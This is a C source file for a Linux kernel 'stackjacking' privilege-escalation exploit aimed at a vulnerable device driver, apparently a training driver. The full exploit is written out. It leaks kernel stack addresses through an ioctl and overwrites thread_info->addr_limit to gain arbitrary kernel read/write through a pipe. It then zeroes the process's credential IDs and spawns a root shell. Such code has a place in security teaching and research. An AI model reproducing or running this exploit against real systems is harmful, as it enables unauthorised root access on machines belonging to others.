/* stackjacking exploit
   http://inaz2.hatenablog.com/entry/2015/03/27/021422
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#include "sjack.h"

#define KSTACKBASE 0xffff880000000000
#define KSTACKTOP 0xffff8800c0000000
#define KERNELBASE 0xffff880000000000

int pipefd[2];

int is_kernel_stack(unsigned long value)
{
    return (KSTACKBASE <= value && value < KSTACKTOP);
}

int is_kernel_pointer(void *ptr)
{
    unsigned long value = (unsigned long)ptr;
    return (KERNELBASE <= value);
}

int kmemcpy(void *dest, void *src, size_t size)
{
    write(pipefd[1], src, size);
    read(pipefd[0], dest, size);
    return size;
}

int main()
{
    int fd;
    int ret_val;
    struct ioctl_sl_arg sl_arg;
    struct ioctl_aaw_arg aaw_arg;

    /* open the vulnerable device */
    fd = open(DEVICE_PATH, 0);
    if (fd < 0) {
        printf("Can't open device file: %s\n", DEVICE_PATH);
        exit(1);
    }

    puts("[*] leak kernel stack values");
    sl_arg.index = 0;
    sl_arg.value = 0;
    while (!is_kernel_stack(sl_arg.value)) {
        ret_val = ioctl(fd, IOCTL_STACK_LEAK, &sl_arg);
        if (ret_val < 0) {
            printf("ioctl failed: %d\n", ret_val);
            exit(1);
        }
        printf("%lx\n", sl_arg.value);
        sl_arg.index++;
    }
    void *kstack = (void *)(sl_arg.value & ~0x3fff);
    printf("[+] kernel stack address = %p\n", kstack);

    puts("[*] overwrite thread_info->addr_limit");
    void *addr_limit = kstack + sizeof(void *)*2 + sizeof(int)*4;
    aaw_arg.ptr = addr_limit;
    aaw_arg.value = -1UL;
    char a;
    scanf ("%c", &a);
    ret_val = ioctl(fd, IOCTL_AAW, &aaw_arg);
    if (ret_val < 0) {
        printf("ioctl failed: %d\n", ret_val);
        exit(1);
    }

    close(fd);
    ret_val = pipe(pipefd);
    if (ret_val < 0) {
        printf("pipe failed: %d\n", ret_val);
        exit(1);
    }

    void *task_struct;
    kmemcpy(&task_struct, kstack, sizeof(void *));
    printf("[+] task_struct = %p\n", task_struct);

    void *real_cred;
    void *cred;
    unsigned int uid;
    puts("[*] seek task_struct->real_cred");
    while (1) {
        task_struct += sizeof(void *);
        kmemcpy(&real_cred, task_struct, sizeof(void *));
        if (!is_kernel_pointer(real_cred)) {
            printf("%p -> %p\n", task_struct, real_cred);
            continue;
        }
        kmemcpy(&uid, real_cred + sizeof(unsigned int), sizeof(unsigned int));
        printf("%p -> %p -> %u\n", task_struct, real_cred, uid);
        if (getuid() == uid) {
            cred = task_struct + sizeof(void *);
            break;
        }
    }
    printf("[+] task_struct->real_cred = %p\n", real_cred);
    printf("[+] task_struct->cred = %p\n", cred);

    puts("[*] overwrite task_struct->real_cred members");
    unsigned int zeroarray[8] = {};
    kmemcpy(real_cred + 4, &zeroarray, sizeof(zeroarray));

    kmemcpy(&uid, real_cred + sizeof(unsigned int), sizeof(unsigned int));
    printf("[+] task_struct->real_cred->uid = %d\n", uid);

    puts("[*] overwrite task_struct->cred to the same address as real_cred");
    kmemcpy(cred, &real_cred, sizeof(void *));

    kmemcpy(&cred, cred, sizeof(void *));
    printf("[+] task_struct->cred = %p\n", cred);

    close(pipefd[0]);
    close(pipefd[1]);

    printf("[+] getuid() = %d\n", getuid());
    execl("/bin/sh", "sh", NULL);
}
